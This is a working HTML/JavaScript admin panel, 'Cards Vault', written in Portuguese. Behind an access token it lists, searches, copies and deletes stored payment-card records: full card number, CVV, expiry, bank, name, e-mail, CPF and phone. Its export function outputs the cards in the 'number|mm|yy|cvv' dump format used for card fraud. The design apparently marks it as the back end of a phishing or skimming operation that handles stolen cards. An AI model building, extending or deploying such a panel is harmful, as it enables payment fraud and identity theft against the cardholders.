<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Cards Vault</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',system-ui,sans-serif;background:#f5f5f5;color:#111;font-size:14px;-webkit-font-smoothing:antialiased}

/* LOGIN */
#loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #e5e5e5;border-radius:8px;padding:40px;width:360px}
.login-box h1{font-size:18px;font-weight:600;margin-bottom:4px}
.login-box p{color:#888;font-size:13px;margin-bottom:28px}
.login-box label{display:block;font-size:12px;font-weight:500;color:#555;margin-bottom:6px}
.login-box input{width:100%;height:44px;border:1px solid #e0e0e0;border-radius:6px;padding:0 14px;font-size:14px;font-family:inherit;outline:none;background:#fafafa;transition:border-color .15s}
.login-box input:focus{border-color:#111;background:#fff}
.login-box button{width:100%;height:44px;margin-top:14px;background:#111;border:none;border-radius:6px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .15s}
.login-box button:hover{opacity:.85}
.login-err{color:#c00;font-size:12px;margin-top:10px;display:none}

/* MAIN */
#mainScreen{display:none;min-height:100vh}

/* TOPBAR */
.topbar{background:#fff;border-bottom:1px solid #e5e5e5;padding:0 28px;display:flex;align-items:center;justify-content:space-between;height:56px;position:sticky;top:0;z-index:10}
.topbar-brand{font-size:15px;font-weight:600}
.topbar-right{display:flex;align-items:center;gap:8px}
.btn-sm{height:34px;padding:0 14px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;font-family:inherit;border:1px solid #e0e0e0;background:#fff;color:#555;transition:all .15s;display:flex;align-items:center;gap:6px;white-space:nowrap}
.btn-sm:hover{border-color:#bbb;color:#111}
.btn-sm.primary{background:#111;border-color:#111;color:#fff}
.btn-sm.primary:hover{opacity:.85}
.btn-sm.danger{color:#c00;border-color:#fcc}
.btn-sm.danger:hover{background:#fff5f5;border-color:#e88}

/* STATS */
.stats{display:flex;gap:1px;background:#e5e5e5;border-bottom:1px solid #e5e5e5}
.stat{flex:1;background:#fff;padding:16px 24px}
.stat-lbl{font-size:11px;font-weight:500;color:#999;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
.stat-val{font-size:22px;font-weight:600;color:#111}

/* CONTENT */
.content{padding:24px 28px}

/* TOOLBAR */
.toolbar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
.search-wrap{position:relative;flex:1;min-width:220px}
.search-ico{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#ccc;pointer-events:none}
.search{width:100%;height:38px;border:1px solid #e0e0e0;border-radius:6px;padding:0 12px 0 36px;font-size:13px;font-family:inherit;outline:none;background:#fff;transition:border-color .15s}
.search:focus{border-color:#999}
.search::placeholder{color:#bbb}

/* TABLE */
.tbl-wrap{background:#fff;border:1px solid #e5e5e5;border-radius:8px;overflow:hidden}
table{width:100%;border-collapse:collapse}
th{padding:10px 16px;text-align:left;font-size:11px;font-weight:600;color:#aaa;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #f0f0f0;background:#fafafa;white-space:nowrap}
td{padding:12px 16px;border-bottom:1px solid #f5f5f5;vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:#fafafa}
.name{font-weight:600;font-size:13px}
.sub{font-size:12px;color:#aaa;margin-top:2px}
.mono{font-family:'Courier New',monospace;font-size:12px;color:#666}
.badge{display:inline-block;font-size:11px;font-weight:500;padding:2px 8px;border-radius:4px;background:#f0f0f0;color:#666}
.badge.visa{background:#eff4ff;color:#3b6ed4}
.badge.mastercard{background:#fff4ee;color:#c05a10}
.exp{font-size:12px;font-weight:500}
.exp.ok{color:#2a9a55}
.exp.warn{color:#c28a10}
.dt{font-size:12px;color:#bbb}
.acts{display:flex;gap:5px}
.act-btn{width:30px;height:30px;border:1px solid #ebebeb;border-radius:5px;background:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#ccc;transition:all .15s;flex-shrink:0}
.act-btn:hover{border-color:#bbb;color:#555}
.act-btn.del:hover{border-color:#f5baba;color:#c00;background:#fff8f8}
.empty{text-align:center;padding:60px;color:#ccc;font-size:13px}

/* OVERLAY / MODAL */
.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.35);z-index:100;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(3px)}
.overlay.show{display:flex}
.modal{background:#fff;border-radius:10px;width:100%;max-width:500px;max-height:90vh;overflow-y:auto;box-shadow:0 16px 48px rgba(0,0,0,.18)}
.modal-hd{display:flex;justify-content:space-between;align-items:center;padding:18px 22px;border-bottom:1px solid #f0f0f0}
.modal-hd h2{font-size:15px;font-weight:600}
.modal-close{width:28px;height:28px;border:none;background:#f0f0f0;border-radius:5px;cursor:pointer;font-size:16px;color:#888;display:flex;align-items:center;justify-content:center;transition:background .15s;line-height:1}
.modal-close:hover{background:#e5e5e5;color:#333}
.modal-body{padding:20px 22px}
.field-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.field{display:flex;flex-direction:column;gap:4px}
.field.full{grid-column:1/-1}
.f-lbl{font-size:10px;font-weight:600;color:#bbb;text-transform:uppercase;letter-spacing:.5px}
.f-val{font-size:13px;color:#111;background:#f7f7f7;border-radius:5px;padding:8px 11px;font-family:'Courier New',monospace;word-break:break-all;line-height:1.4}
.copy-btn{margin-top:2px;font-size:11px;color:#aaa;background:none;border:1px solid #e8e8e8;border-radius:4px;padding:2px 8px;cursor:pointer;width:fit-content;font-family:inherit;transition:all .15s}
.copy-btn:hover{border-color:#aaa;color:#555}
.copy-btn.ok{color:#2a9a55;border-color:#9adeba}

/* CONFIRM */
.confirm-box{background:#fff;border-radius:10px;padding:28px 24px;width:100%;max-width:300px;text-align:center;box-shadow:0 16px 48px rgba(0,0,0,.18)}
.confirm-box h2{font-size:15px;font-weight:600;margin-bottom:8px}
.confirm-box p{font-size:13px;color:#777;line-height:1.55;margin-bottom:22px}
.confirm-btns{display:flex;gap:8px}
.btn-cancel{flex:1;height:40px;border:1px solid #e0e0e0;border-radius:6px;background:#fff;color:#555;font-size:13px;font-weight:500;cursor:pointer;font-family:inherit;transition:background .15s}
.btn-cancel:hover{background:#f5f5f5}
.btn-ok{flex:1;height:40px;border:none;border-radius:6px;background:#cc0000;color:#fff;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .15s}
.btn-ok:hover{opacity:.88}

@media(max-width:768px){
  .topbar{padding:0 16px}
  .stats{flex-wrap:wrap}
  .stat{min-width:50%}
  .content{padding:16px}
  .col-hide{display:none}
}
</style>
</head>
<body>

<div id="loginScreen">
  <div class="login-box">
    <h1>Cards Vault</h1>
    <p>Painel administrativo</p>
    <label>Token de acesso</label>
    <input type="password" id="tokenInput" placeholder="••••••••" onkeydown="if(event.key==='Enter')login()"/>
    <button onclick="login()">Entrar</button>
    <div class="login-err" id="loginErr">Token inválido.</div>
  </div>
</div>

<div id="mainScreen">
  <div class="topbar">
    <div class="topbar-brand">Cards Vault</div>
    <div class="topbar-right">
      <button class="btn-sm primary" id="btnExp" onclick="exportar()">↓ Exportar .txt</button>
      <button class="btn-sm danger" onclick="confirmClear()">Limpar tudo</button>
      <button class="btn-sm" onclick="logout()">Sair</button>
    </div>
  </div>

  <div class="stats">
    <div class="stat"><div class="stat-lbl">Total</div><div class="stat-val" id="statTotal">—</div></div>
    <div class="stat"><div class="stat-lbl">Últimas 24h</div><div class="stat-val" id="statLast24">—</div></div>
    <div class="stat"><div class="stat-lbl" id="sb1l">—</div><div class="stat-val" id="sb1v">0</div></div>
    <div class="stat"><div class="stat-lbl" id="sb2l">—</div><div class="stat-val" id="sb2v">0</div></div>
  </div>

  <div class="content">
    <div class="toolbar">
      <div class="search-wrap">
        <svg class="search-ico" width="14" height="14" viewBox="0 0 24 24" fill="none">
          <circle cx="11" cy="11" r="8" stroke="currentColor" stroke-width="2"/>
          <path d="M21 21l-4.35-4.35" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
        </svg>
        <input class="search" id="searchInput" placeholder="Buscar nome, e-mail, bandeira…" oninput="debounce()"/>
      </div>
      <button class="btn-sm" onclick="loadAll()">↺ Atualizar</button>
    </div>

    <div class="tbl-wrap">
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Nome / E-mail</th>
            <th class="col-hide">CPF</th>
            <th>Bandeira</th>
            <th>Final</th>
            <th>Validade</th>
            <th class="col-hide">Cadastro</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="tbody">
          <tr><td colspan="8" class="empty">Carregando…</td></tr>
        </tbody>
      </table>
    </div>
  </div>
</div>

<!-- DETALHE -->
<div class="overlay" id="detailModal" onclick="if(event.target===this)closeDetail()">
  <div class="modal">
    <div class="modal-hd">
      <h2>Dados do cartão</h2>
      <button class="modal-close" onclick="closeDetail()">✕</button>
    </div>
    <div class="modal-body">
      <div class="field-grid" id="detailGrid"></div>
    </div>
  </div>
</div>

<!-- CONFIRMAR -->
<div class="overlay" id="confirmModal" onclick="if(event.target===this)closeConfirm()">
  <div class="confirm-box">
    <h2 id="cTitle">Confirmar</h2>
    <p id="cSub"></p>
    <div class="confirm-btns">
      <button class="btn-cancel" onclick="closeConfirm()">Cancelar</button>
      <button class="btn-ok" id="cOk">Confirmar</button>
    </div>
  </div>
</div>

<script>
let _tok = localStorage.getItem('cv_tok') || '';
const _c = {};
let _t = null;

async function login() {
  const t = document.getElementById('tokenInput').value.trim(); if (!t) return;
  const r = await fetch('/api/admin/stats', { headers: { 'x-admin-token': t } });
  if (r.ok) { _tok = t; localStorage.setItem('cv_tok', t); document.getElementById('loginErr').style.display='none'; showMain(); }
  else document.getElementById('loginErr').style.display='block';
}
function logout() { _tok=''; localStorage.removeItem('cv_tok'); document.getElementById('mainScreen').style.display='none'; document.getElementById('loginScreen').style.display='flex'; }
function showMain() { document.getElementById('loginScreen').style.display='none'; document.getElementById('mainScreen').style.display='block'; loadAll(); }
if (_tok) fetch('/api/admin/stats',{headers:{'x-admin-token':_tok}}).then(r=>r.ok?showMain():logout()).catch(()=>{});

async function loadAll() { await Promise.all([loadStats(), loadCards()]); }

async function loadStats() {
  const r = await fetch('/api/admin/stats', { headers: { 'x-admin-token': _tok } }); if (!r.ok) return;
  const d = await r.json();
  document.getElementById('statTotal').textContent = d.total;
  document.getElementById('statLast24').textContent = d.last24;
  const b = d.brands||[];
  [[0,'sb1l','sb1v'],[1,'sb2l','sb2v']].forEach(([i,l,v])=>{
    const x=b[i]; document.getElementById(l).textContent=x?cap(x.brand):'—'; document.getElementById(v).textContent=x?x.count:'0';
  });
}

async function loadCards(q) {
  const r = await fetch('/api/admin/cards'+(q?'?search='+encodeURIComponent(q):''),{headers:{'x-admin-token':_tok}}); if (!r.ok) return;
  const d = await r.json(); renderTable(d.cards||[]);
}
function debounce() { clearTimeout(_t); _t=setTimeout(()=>loadCards(document.getElementById('searchInput').value.trim()||undefined),320); }

function renderTable(cards) {
  const tb = document.getElementById('tbody');
  if (!cards.length) { tb.innerHTML='<tr><td colspan="8" class="empty">Nenhum cartão encontrado.</td></tr>'; return; }
  cards.forEach(c=>_c[c.id]=c);
  tb.innerHTML = cards.map((c,i) => {
    const br=(c.brand||'').toLowerCase();
    const bc=br.includes('visa')?'visa':br.includes('master')?'mastercard':'';
    const [mm='',yy='']=(c.expiry||'').split('/');
    let ec='ok'; if(mm&&yy){const diff=(parseInt('20'+yy)-new Date().getFullYear())*12+parseInt(mm)-new Date().getMonth()-1; if(diff<=3)ec='warn';}
    const dt=c.created_at?new Date(c.created_at).toLocaleDateString('pt-BR',{day:'2-digit',month:'2-digit',year:'2-digit'}):'—';
    return `<tr>
      <td class="mono" style="color:#ccc">${i+1}</td>
      <td><div class="name">${esc(c.nome||'—')}</div><div class="sub">${esc(c.email||'—')}</div></td>
      <td class="mono col-hide" style="font-size:12px">${esc(c.cpf||'—')}</td>
      <td><span class="badge ${bc}">${esc(c.brand||'—')}</span></td>
      <td class="mono">••&nbsp;${esc(c.last4||'????')}</td>
      <td><span class="exp ${ec}">${esc(c.expiry||'—')}</span></td>
      <td class="dt col-hide">${dt}</td>
      <td><div class="acts">
        <button class="act-btn" onclick="openDetail('${c.id}')" title="Ver">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/><path d="M1 12C3 7 7 4 12 4s9 3 11 8c-2 5-6 8-11 8S3 17 1 12z" stroke="currentColor" stroke-width="2"/></svg>
        </button>
        <button class="act-btn del" onclick="confirmDel('${esc(c.id)}','${esc(c.nome||'este cartão')}')" title="Deletar">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><polyline points="3 6 5 6 21 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M19 6l-1 14H6L5 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M9 6V4h6v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
        </button>
      </div></td>
    </tr>`;
  }).join('');
}

function openDetail(id) {
  const c=_c[id]; if(!c) return;
  const dt=c.created_at?new Date(c.created_at).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}):'—';
  const fields=[['Nome',c.nome,'full'],['E-mail',c.email,'full'],['CPF',c.cpf,''],['Telefone',c.telefone,''],['Número',c.card_number,'full'],['CVV',c.cvv,''],['Validade',c.expiry,''],['Banco',c.bank,''],['Nível',c.card_level,''],['Tipo',c.card_type,''],['Cadastro',dt,'full']];
  document.getElementById('detailGrid').innerHTML=fields.filter(([,v])=>v).map(([l,v,s])=>`
    <div class="field${s?' '+s:''}">
      <div class="f-lbl">${l}</div>
      <div class="f-val">${esc(v)}</div>
      <button class="copy-btn" onclick="cp(this,'${esc(String(v))}')">copiar</button>
    </div>`).join('');
  document.getElementById('detailModal').classList.add('show');
}
function closeDetail(){document.getElementById('detailModal').classList.remove('show');}

function cp(btn,text){navigator.clipboard.writeText(text).then(()=>{btn.textContent='✓ copiado';btn.classList.add('ok');setTimeout(()=>{btn.textContent='copiar';btn.classList.remove('ok');},1800);});}

function openConfirm(title,sub,cb){document.getElementById('cTitle').textContent=title;document.getElementById('cSub').innerHTML=sub;document.getElementById('cOk').onclick=()=>{closeConfirm();cb();};document.getElementById('confirmModal').classList.add('show');}
function closeConfirm(){document.getElementById('confirmModal').classList.remove('show');}
function confirmDel(id,nome){openConfirm('Deletar cartão',`Deletar o cartão de <strong>${esc(nome)}</strong>?`,async()=>{await fetch('/api/admin/cards/'+id,{method:'DELETE',headers:{'x-admin-token':_tok}});loadAll();});}
function confirmClear(){openConfirm('Limpar tudo','Isso apaga <strong>todos</strong> os cartões. Ação irreversível.',async()=>{await fetch('/api/admin/cards',{method:'DELETE',headers:{'x-admin-token':_tok,'Content-Type':'application/json'},body:JSON.stringify({confirm:'DELETAR_TUDO'})});loadAll();});}

async function exportar(){
  const btn=document.getElementById('btnExp');btn.textContent='⏳ Aguarde…';btn.disabled=true;
  try{const r=await fetch('/api/admin/cards',{headers:{'x-admin-token':_tok}});const d=await r.json();
  const lines=(d.cards||[]).map(c=>{const[mm='',yy='']=(c.expiry||'').split('/');return`${(c.card_number||'').replace(/\D/g,'')}|${mm}|${yy}|${c.cvv||''}`;});
  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([lines.join('\n')],{type:'text/plain'}));a.download=`cartoes_${new Date().toISOString().slice(0,10)}.txt`;a.click();}
  catch(e){alert('Erro: '+e.message);}
  btn.textContent='↓ Exportar .txt';btn.disabled=false;
}

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function cap(s){return s?s.charAt(0).toUpperCase()+s.slice(1):s;}
document.addEventListener('keydown',e=>{if(e.key==='Escape'){closeDetail();closeConfirm();}});
</script>
</body>
</html>
